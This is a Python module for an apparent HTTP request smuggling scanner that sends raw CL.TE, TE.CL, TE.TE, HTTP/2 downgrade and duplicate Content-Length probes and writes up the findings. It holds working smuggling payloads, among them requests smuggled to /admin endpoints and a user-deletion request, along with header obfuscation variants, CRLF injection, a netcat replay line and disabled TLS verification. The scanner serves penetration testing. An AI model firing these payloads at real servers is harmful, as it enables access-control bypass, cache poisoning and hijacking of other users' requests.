"""
HTTP Request Smuggling Detection Service

Advanced HTTP request smuggling detection including:
- CL.TE (Content-Length takes precedence on front-end, Transfer-Encoding on back-end)
- TE.CL (Transfer-Encoding takes precedence on front-end, Content-Length on back-end)
- TE.TE (Both use Transfer-Encoding but with obfuscation)
- H2.CL (HTTP/2 to HTTP/1.1 with Content-Length)
- H2.TE (HTTP/2 to HTTP/1.1 with Transfer-Encoding)

Techniques based on PortSwigger research and real-world exploitation patterns.
"""

import asyncio
import aiohttp
import logging
import uuid
import time
import ssl
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Any, Optional, Tuple
from enum import Enum
from datetime import datetime

logger = logging.getLogger(__name__)


class SmugglingTechnique(str, Enum):
    """HTTP smuggling technique types."""
    CL_TE = "cl_te"           # Front-end uses Content-Length, back-end uses Transfer-Encoding
    TE_CL = "te_cl"           # Front-end uses Transfer-Encoding, back-end uses Content-Length
    TE_TE = "te_te"           # Both use TE but with obfuscation to confuse one server
    H2_CL = "h2_cl"           # HTTP/2 downgrade with Content-Length
    H2_TE = "h2_te"           # HTTP/2 downgrade with Transfer-Encoding
    CL_CL = "cl_cl"           # Duplicate Content-Length headers


class SmugglingImpact(str, Enum):
    """Impact levels for smuggling vulnerabilities."""
    CRITICAL = "critical"     # Full request smuggling confirmed
    HIGH = "high"             # Timing differential suggests vulnerability
    MEDIUM = "medium"         # Desync detected but not confirmed exploitable
    LOW = "low"               # Minor anomaly detected
    INFO = "info"             # Potential indicator only


@dataclass
class SmugglingPayload:
    """A smuggling test payload."""
    id: str
    technique: SmugglingTechnique
    name: str
    description: str
    headers: Dict[str, str]
    body: str
    expected_behavior: str
    timeout_indicator: bool = False  # If True, timeout indicates vulnerability
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            **asdict(self),
            "technique": self.technique.value,
        }


@dataclass
class SmugglingResult:
    """Result from a smuggling test."""
    id: str
    payload_id: str
    technique: SmugglingTechnique
    vulnerable: bool
    confidence: float
    impact: SmugglingImpact
    timing_ms: float
    response_code: Optional[int]
    response_body: str
    indicators: List[str]
    error: Optional[str] = None
    raw_request: str = ""
    raw_response: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            **asdict(self),
            "technique": self.technique.value,
            "impact": self.impact.value,
        }


@dataclass
class SmugglingFinding:
    """A confirmed smuggling vulnerability finding."""
    id: str
    technique: SmugglingTechnique
    endpoint: str
    severity: str
    title: str
    description: str
    proof_of_concept: str
    impact: str
    remediation: str
    cvss_score: float
    cvss_vector: str
    cwe_id: str = "CWE-444"
    results: List[SmugglingResult] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            **asdict(self),
            "technique": self.technique.value,
            "results": [r.to_dict() for r in self.results],
        }


# =============================================================================
# SMUGGLING PAYLOADS
# =============================================================================

def generate_cl_te_payloads() -> List[SmugglingPayload]:
    """Generate CL.TE smuggling payloads."""
    payloads = []
    
    # Basic CL.TE - timeout detection
    payloads.append(SmugglingPayload(
        id="cl_te_basic_timeout",
        technique=SmugglingTechnique.CL_TE,
        name="CL.TE Basic Timeout Detection",
        description="Send request where CL is shorter than actual body with chunked encoding",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        },
        body="1\r\nZ\r\nQ",  # CL says 4 bytes, but chunked encoding incomplete
        expected_behavior="If vulnerable, back-end waits for more chunks causing timeout",
        timeout_indicator=True,
    ))
    
    # CL.TE - Request prefix injection
    payloads.append(SmugglingPayload(
        id="cl_te_prefix_inject",
        technique=SmugglingTechnique.CL_TE,
        name="CL.TE Prefix Injection",
        description="Inject a GET request prefix that affects next request",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        body="0\r\n\r\nG",  # 'G' becomes prefix of next request
        expected_behavior="Next request gets 'G' prefix causing 'GGET' or 'GPOST'",
        timeout_indicator=False,
    ))
    
    # CL.TE - Smuggle full request
    smuggled_request = "GET /admin HTTP/1.1\r\nHost: localhost\r\nX-Ignore: "
    body_len = len(smuggled_request)
    payloads.append(SmugglingPayload(
        id="cl_te_full_smuggle",
        technique=SmugglingTechnique.CL_TE,
        name="CL.TE Full Request Smuggling",
        description="Smuggle a complete request to access restricted endpoint",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        },
        body=f"0\r\n\r\n{smuggled_request}",
        expected_behavior="Back-end processes smuggled /admin request",
        timeout_indicator=False,
    ))
    
    # CL.TE with different chunk sizes
    payloads.append(SmugglingPayload(
        id="cl_te_chunked_poison",
        technique=SmugglingTechnique.CL_TE,
        name="CL.TE Chunked Response Poison",
        description="Use chunked encoding to poison response queue",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "35",
            "Transfer-Encoding": "chunked",
        },
        body="0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x",
        expected_behavior="Subsequent responses may be poisoned",
        timeout_indicator=False,
    ))
    
    return payloads


def generate_te_cl_payloads() -> List[SmugglingPayload]:
    """Generate TE.CL smuggling payloads."""
    payloads = []
    
    # Basic TE.CL timeout detection
    payloads.append(SmugglingPayload(
        id="te_cl_basic_timeout",
        technique=SmugglingTechnique.TE_CL,
        name="TE.CL Basic Timeout Detection",
        description="Front-end uses TE, back-end uses CL - incomplete request",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "3",
            "Transfer-Encoding": "chunked",
        },
        body="8\r\nSMUGGLED\r\n0\r\n\r\n",
        expected_behavior="Back-end reads only 3 bytes, leaving data in buffer",
        timeout_indicator=True,
    ))
    
    # TE.CL - Smuggle GPOST
    payloads.append(SmugglingPayload(
        id="te_cl_gpost",
        technique=SmugglingTechnique.TE_CL,
        name="TE.CL GPOST Injection",
        description="Inject partial request that creates malformed method",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        },
        body="5c\r\nGPOST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        expected_behavior="Back-end may process GPOST as malformed request",
        timeout_indicator=False,
    ))
    
    # TE.CL - Full request smuggling
    payloads.append(SmugglingPayload(
        id="te_cl_admin_smuggle",
        technique=SmugglingTechnique.TE_CL,
        name="TE.CL Admin Endpoint Smuggling",
        description="Smuggle request to access admin endpoint",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        },
        body="71\r\nGET /admin/delete?user=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n\r\n0\r\n\r\n",
        expected_behavior="Admin endpoint accessed bypassing front-end restrictions",
        timeout_indicator=False,
    ))
    
    return payloads


def generate_te_te_payloads() -> List[SmugglingPayload]:
    """Generate TE.TE smuggling payloads with obfuscation."""
    payloads = []
    
    # TE obfuscation variants
    te_variants = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: \nchunked",
        "X: X\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding: chunked\r\n X: X",
        "Transfer-Encoding\r\n : chunked",
    ]
    
    for i, te_header in enumerate(te_variants):
        payloads.append(SmugglingPayload(
            id=f"te_te_obfuscate_{i}",
            technique=SmugglingTechnique.TE_TE,
            name=f"TE.TE Obfuscation Variant {i+1}",
            description=f"TE obfuscation: {te_header[:30]}...",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "4",
                "_raw_te": te_header,  # Special marker for raw header injection
            },
            body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nX: ",
            expected_behavior="One server processes TE, other ignores it",
            timeout_indicator=False,
        ))
    
    # Double TE header
    payloads.append(SmugglingPayload(
        id="te_te_double",
        technique=SmugglingTechnique.TE_TE,
        name="TE.TE Double Header",
        description="Two Transfer-Encoding headers with different values",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
            "Transfer-encoding": "identity",  # Note lowercase
        },
        body="0\r\n\r\n",
        expected_behavior="Servers may process different TE headers",
        timeout_indicator=False,
    ))
    
    return payloads


def generate_h2_smuggling_payloads() -> List[SmugglingPayload]:
    """Generate HTTP/2 downgrade smuggling payloads."""
    payloads = []
    
    # H2.CL - HTTP/2 to HTTP/1.1 with Content-Length manipulation
    payloads.append(SmugglingPayload(
        id="h2_cl_basic",
        technique=SmugglingTechnique.H2_CL,
        name="H2.CL Content-Length Smuggling",
        description="HTTP/2 request with manipulated Content-Length in downgrade",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "0",
            ":method": "POST",
            ":path": "/",
        },
        body="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        expected_behavior="H2 proxy may not validate CL, allowing body smuggling",
        timeout_indicator=False,
    ))
    
    # H2.TE - HTTP/2 with Transfer-Encoding
    payloads.append(SmugglingPayload(
        id="h2_te_inject",
        technique=SmugglingTechnique.H2_TE,
        name="H2.TE Chunked Injection",
        description="Inject Transfer-Encoding in HTTP/2 (should be forbidden)",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Transfer-Encoding": "chunked",  # Forbidden in H2 but may be passed
            ":method": "POST",
            ":path": "/",
        },
        body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        expected_behavior="If H2 proxy passes TE header, smuggling possible",
        timeout_indicator=False,
    ))
    
    # H2 CRLF injection in header value
    payloads.append(SmugglingPayload(
        id="h2_crlf_header",
        technique=SmugglingTechnique.H2_CL,
        name="H2 CRLF Header Injection",
        description="CRLF injection in HTTP/2 header value",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Injected": "foo\r\nTransfer-Encoding: chunked",
            ":method": "POST",
            ":path": "/",
        },
        body="0\r\n\r\n",
        expected_behavior="CRLF in header injects new Transfer-Encoding",
        timeout_indicator=False,
    ))
    
    return payloads


def generate_cl_cl_payloads() -> List[SmugglingPayload]:
    """Generate duplicate Content-Length payloads."""
    payloads = []
    
    payloads.append(SmugglingPayload(
        id="cl_cl_duplicate",
        technique=SmugglingTechnique.CL_CL,
        name="Duplicate Content-Length",
        description="Two Content-Length headers with different values",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "6",
            "Content-length": "100",  # Lowercase variant
        },
        body="x=1\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        expected_behavior="Servers may use different CL values",
        timeout_indicator=False,
    ))
    
    return payloads


# =============================================================================
# SMUGGLING DETECTOR
# =============================================================================

class HTTPSmugglingDetector:
    """Detects HTTP request smuggling vulnerabilities."""
    
    def __init__(
        self,
        timeout: float = 10.0,
        timeout_threshold: float = 5.0,
        max_retries: int = 2,
    ):
        self.timeout = timeout
        self.timeout_threshold = timeout_threshold
        self.max_retries = max_retries
        self._results: List[SmugglingResult] = []
        self._findings: List[SmugglingFinding] = []
    
    def _build_raw_request(
        self,
        method: str,
        path: str,
        host: str,
        payload: SmugglingPayload,
    ) -> str:
        """Build raw HTTP request with smuggling headers."""
        lines = [f"{method} {path} HTTP/1.1"]
        lines.append(f"Host: {host}")
        
        for header, value in payload.headers.items():
            if header == "_raw_te":
                # Special raw Transfer-Encoding injection
                lines.append(value)
            elif not header.startswith(":"):  # Skip H2 pseudo-headers
                lines.append(f"{header}: {value}")
        
        lines.append("")  # Empty line before body
        
        request = "\r\n".join(lines) + "\r\n" + payload.body
        return request
    
    async def _send_raw_request(
        self,
        host: str,
        port: int,
        request: str,
        use_ssl: bool = False,
    ) -> Tuple[Optional[int], str, float, Optional[str]]:
        """Send raw HTTP request and measure timing."""
        start_time = time.time()
        
        try:
            if use_ssl:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_context),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=self.timeout
                )
            
            writer.write(request.encode())
            await writer.drain()
            
            # Read response
            response_data = await asyncio.wait_for(
                reader.read(8192),
                timeout=self.timeout
            )
            
            writer.close()
            await writer.wait_closed()
            
            elapsed = (time.time() - start_time) * 1000
            response_str = response_data.decode('utf-8', errors='replace')
            
            # Parse status code
            status_code = None
            if response_str.startswith("HTTP/"):
                parts = response_str.split(" ", 2)
                if len(parts) >= 2:
                    try:
                        status_code = int(parts[1])
                    except ValueError:
                        pass
            
            return status_code, response_str, elapsed, None
            
        except asyncio.TimeoutError:
            elapsed = (time.time() - start_time) * 1000
            return None, "", elapsed, "timeout"
            
        except Exception as e:
            elapsed = (time.time() - start_time) * 1000
            return None, "", elapsed, str(e)
    
    async def _test_payload(
        self,
        url: str,
        method: str,
        payload: SmugglingPayload,
    ) -> SmugglingResult:
        """Test a single smuggling payload."""
        from urllib.parse import urlparse
        
        parsed = urlparse(url)
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        use_ssl = parsed.scheme == "https"
        
        raw_request = self._build_raw_request(method, path, host, payload)
        
        indicators = []
        vulnerable = False
        confidence = 0.0
        impact = SmugglingImpact.INFO
        
        # Send baseline request first
        baseline_code, baseline_body, baseline_time, baseline_error = await self._send_raw_request(
            host, port, 
            f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n",
            use_ssl
        )
        
        # Send smuggling payload
        status_code, response_body, timing_ms, error = await self._send_raw_request(
            host, port, raw_request, use_ssl
        )
        
        # Analyze results
        if payload.timeout_indicator and error == "timeout":
            # Timeout was expected - indicates vulnerability
            indicators.append("Request timed out as expected for vulnerable target")
            vulnerable = True
            confidence = 0.8
            impact = SmugglingImpact.HIGH
            
        elif payload.timeout_indicator and timing_ms > (baseline_time + self.timeout_threshold * 1000):
            # Significant delay
            indicators.append(f"Significant timing delay: {timing_ms:.0f}ms vs baseline {baseline_time:.0f}ms")
            vulnerable = True
            confidence = 0.7
            impact = SmugglingImpact.HIGH
            
        elif not payload.timeout_indicator:
            # Analyze response for smuggling indicators
            response_lower = response_body.lower()
            
            # Check for error messages indicating desync
            desync_indicators = [
                "bad request", "invalid request", "malformed",
                "unrecognized", "gpost", "gget", "gput",
                "method not allowed", "not implemented",
            ]
            
            for indicator in desync_indicators:
                if indicator in response_lower:
                    indicators.append(f"Desync indicator found: '{indicator}'")
                    vulnerable = True
                    confidence = max(confidence, 0.6)
                    impact = SmugglingImpact.MEDIUM
            
            # Check if response contains admin/forbidden content
            if "admin" in payload.body.lower():
                if "admin" in response_lower and status_code in [200, 302, 403]:
                    indicators.append("Admin endpoint may have been accessed")
                    vulnerable = True
                    confidence = max(confidence, 0.85)
                    impact = SmugglingImpact.CRITICAL
            
            # Check for multiple responses (request splitting)
            http_count = response_body.count("HTTP/1.")
            if http_count > 1:
                indicators.append(f"Multiple HTTP responses detected ({http_count})")
                vulnerable = True
                confidence = max(confidence, 0.9)
                impact = SmugglingImpact.CRITICAL
            
            # Check for backend errors vs frontend
            if status_code != baseline_code:
                indicators.append(f"Status code changed from {baseline_code} to {status_code}")
                confidence = max(confidence, 0.5)
        
        if not indicators:
            indicators.append("No smuggling indicators detected")
        
        result = SmugglingResult(
            id=str(uuid.uuid4())[:8],
            payload_id=payload.id,
            technique=payload.technique,
            vulnerable=vulnerable,
            confidence=confidence,
            impact=impact,
            timing_ms=timing_ms,
            response_code=status_code,
            response_body=response_body[:2000],
            indicators=indicators,
            error=error,
            raw_request=raw_request[:1000],
            raw_response=response_body[:1000],
        )
        
        self._results.append(result)
        return result
    
    async def scan(
        self,
        url: str,
        method: str = "POST",
        techniques: Optional[List[SmugglingTechnique]] = None,
        callback: Optional[callable] = None,
    ) -> Dict[str, Any]:
        """
        Scan a URL for HTTP smuggling vulnerabilities.
        
        Args:
            url: Target URL
            method: HTTP method (usually POST for smuggling)
            techniques: List of techniques to test (default: all)
            callback: Optional async callback for progress updates
            
        Returns:
            Scan results with findings
        """
        if techniques is None:
            techniques = [
                SmugglingTechnique.CL_TE,
                SmugglingTechnique.TE_CL,
                SmugglingTechnique.TE_TE,
                SmugglingTechnique.CL_CL,
            ]
        
        all_payloads = []
        
        if SmugglingTechnique.CL_TE in techniques:
            all_payloads.extend(generate_cl_te_payloads())
        if SmugglingTechnique.TE_CL in techniques:
            all_payloads.extend(generate_te_cl_payloads())
        if SmugglingTechnique.TE_TE in techniques:
            all_payloads.extend(generate_te_te_payloads())
        if SmugglingTechnique.H2_CL in techniques or SmugglingTechnique.H2_TE in techniques:
            all_payloads.extend(generate_h2_smuggling_payloads())
        if SmugglingTechnique.CL_CL in techniques:
            all_payloads.extend(generate_cl_cl_payloads())
        
        results = []
        findings = []
        
        for i, payload in enumerate(all_payloads):
            if callback:
                await callback({
                    "type": "progress",
                    "current": i + 1,
                    "total": len(all_payloads),
                    "payload": payload.name,
                })
            
            try:
                result = await self._test_payload(url, method, payload)
                results.append(result)
                
                if result.vulnerable and result.confidence >= 0.6:
                    # Create finding
                    finding = self._create_finding(url, payload, result)
                    findings.append(finding)
                    self._findings.append(finding)
                    
                    if callback:
                        await callback({
                            "type": "finding",
                            "finding": finding.to_dict(),
                        })
                        
            except Exception as e:
                logger.error(f"Error testing payload {payload.id}: {e}")
                results.append(SmugglingResult(
                    id=str(uuid.uuid4())[:8],
                    payload_id=payload.id,
                    technique=payload.technique,
                    vulnerable=False,
                    confidence=0.0,
                    impact=SmugglingImpact.INFO,
                    timing_ms=0,
                    response_code=None,
                    response_body="",
                    indicators=[f"Error: {e}"],
                    error=str(e),
                ))
            
            # Small delay between tests
            await asyncio.sleep(0.5)
        
        return {
            "url": url,
            "payloads_tested": len(all_payloads),
            "results": [r.to_dict() for r in results],
            "findings": [f.to_dict() for f in findings],
            "vulnerable": any(r.vulnerable for r in results),
            "highest_impact": max(
                (r.impact for r in results if r.vulnerable),
                default=SmugglingImpact.INFO,
                key=lambda x: ["info", "low", "medium", "high", "critical"].index(x.value)
            ).value,
        }
    
    def _create_finding(
        self,
        url: str,
        payload: SmugglingPayload,
        result: SmugglingResult,
    ) -> SmugglingFinding:
        """Create a finding from a vulnerable result."""
        
        severity_map = {
            SmugglingImpact.CRITICAL: "critical",
            SmugglingImpact.HIGH: "high",
            SmugglingImpact.MEDIUM: "medium",
            SmugglingImpact.LOW: "low",
            SmugglingImpact.INFO: "info",
        }
        
        cvss_map = {
            SmugglingImpact.CRITICAL: (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
            SmugglingImpact.HIGH: (8.1, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"),
            SmugglingImpact.MEDIUM: (6.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N"),
            SmugglingImpact.LOW: (4.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N"),
            SmugglingImpact.INFO: (0.0, ""),
        }
        
        cvss_score, cvss_vector = cvss_map.get(result.impact, (0.0, ""))
        
        poc = f"""# HTTP Request Smuggling - {payload.technique.value.upper()}
# Target: {url}
# Technique: {payload.name}

# Raw Request:
{result.raw_request}

# Indicators:
{chr(10).join(f'- {ind}' for ind in result.indicators)}

# To reproduce with curl:
echo -ne "{result.raw_request.encode('unicode_escape').decode()}" | nc {url.split('/')[2].split(':')[0]} 80
"""
        
        return SmugglingFinding(
            id=str(uuid.uuid4())[:8],
            technique=payload.technique,
            endpoint=url,
            severity=severity_map[result.impact],
            title=f"HTTP Request Smuggling via {payload.technique.value.upper()}",
            description=f"{payload.description}\n\nIndicators found:\n" + "\n".join(f"- {i}" for i in result.indicators),
            proof_of_concept=poc,
            impact="""HTTP Request Smuggling can lead to:
- Bypassing security controls and accessing restricted endpoints
- Web cache poisoning affecting other users
- Session hijacking by capturing other users' requests
- Request routing to malicious backends
- Cross-site scripting (XSS) via response splitting""",
            remediation="""To prevent HTTP Request Smuggling:
1. Ensure front-end and back-end servers agree on request boundaries
2. Configure front-end server to normalize ambiguous requests
3. Disable Transfer-Encoding header when not needed
4. Use HTTP/2 end-to-end (not downgraded to HTTP/1.1)
5. Implement request timeouts and size limits
6. Update to latest server versions with smuggling fixes""",
            cvss_score=cvss_score,
            cvss_vector=cvss_vector,
            results=[result],
        )
    
    def get_findings(self) -> List[SmugglingFinding]:
        """Get all findings from the scan."""
        return self._findings
    
    def get_results(self) -> List[SmugglingResult]:
        """Get all raw results from the scan."""
        return self._results
    
    def clear(self):
        """Clear stored results and findings."""
        self._results.clear()
        self._findings.clear()


# =============================================================================
# REQUEST SMUGGLING ANALYZER
# =============================================================================

class SmugglingAnalyzer:
    """Analyze HTTP traffic for smuggling indicators."""
    
    @staticmethod
    def detect_vulnerable_config(
        response_headers: Dict[str, str],
        response_body: str,
    ) -> List[str]:
        """Detect server configurations that may be vulnerable."""
        indicators = []
        
        # Check server header
        server = response_headers.get("Server", "").lower()
        
        vulnerable_servers = {
            "apache": "Apache may be vulnerable if behind a proxy",
            "nginx": "Nginx may be vulnerable if misconfigured with proxy_pass",
            "haproxy": "HAProxy historically vulnerable to various smuggling",
            "squid": "Squid proxy may have parsing inconsistencies",
            "varnish": "Varnish cache may have desync issues",
            "cloudflare": "Check CF configuration for backend desync",
            "akamai": "Check Akamai edge configuration",
        }
        
        for srv, msg in vulnerable_servers.items():
            if srv in server:
                indicators.append(f"Server: {msg}")
        
        # Check for multiple layers (proxy indicators)
        proxy_headers = ["Via", "X-Forwarded-For", "X-Real-IP", "CF-Ray", "X-Amz-Cf-Id"]
        proxy_count = sum(1 for h in proxy_headers if h in response_headers)
        
        if proxy_count >= 2:
            indicators.append(f"Multiple proxy layers detected ({proxy_count} indicators) - increases smuggling risk")
        
        # Check Transfer-Encoding handling
        if "Transfer-Encoding" in response_headers:
            te_value = response_headers["Transfer-Encoding"]
            if te_value != "chunked":
                indicators.append(f"Unusual Transfer-Encoding value: {te_value}")
        
        return indicators
    
    @staticmethod
    def generate_detection_report(
        findings: List[SmugglingFinding],
    ) -> str:
        """Generate a markdown report of smuggling findings."""
        if not findings:
            return "# HTTP Smuggling Scan Report\n\nNo vulnerabilities detected."
        
        lines = [
            "# HTTP Request Smuggling Scan Report",
            "",
            f"**Total Findings:** {len(findings)}",
            "",
            "## Summary",
            "",
        ]
        
        # Group by severity
        by_severity = {}
        for f in findings:
            by_severity.setdefault(f.severity, []).append(f)
        
        for severity in ["critical", "high", "medium", "low"]:
            if severity in by_severity:
                lines.append(f"- **{severity.upper()}**: {len(by_severity[severity])}")
        
        lines.extend(["", "## Detailed Findings", ""])
        
        for finding in findings:
            lines.extend([
                f"### {finding.title}",
                "",
                f"**Severity:** {finding.severity.upper()}",
                f"**CVSS Score:** {finding.cvss_score}",
                f"**CWE:** {finding.cwe_id}",
                f"**Endpoint:** {finding.endpoint}",
                "",
                "**Description:**",
                finding.description,
                "",
                "**Impact:**",
                finding.impact,
                "",
                "**Remediation:**",
                finding.remediation,
                "",
                "---",
                "",
            ])
        
        return "\n".join(lines)


# Global detector instance
_smuggling_detector = HTTPSmugglingDetector()


async def scan_for_smuggling(
    url: str,
    method: str = "POST",
    techniques: Optional[List[str]] = None,
    callback: Optional[callable] = None,
) -> Dict[str, Any]:
    """
    Convenience function to scan for HTTP smuggling.
    
    Args:
        url: Target URL
        method: HTTP method
        techniques: List of technique names (e.g., ["cl_te", "te_cl"])
        callback: Progress callback
        
    Returns:
        Scan results
    """
    technique_enums = None
    if techniques:
        technique_enums = [SmugglingTechnique(t) for t in techniques]
    
    detector = HTTPSmugglingDetector()
    return await detector.scan(url, method, technique_enums, callback)
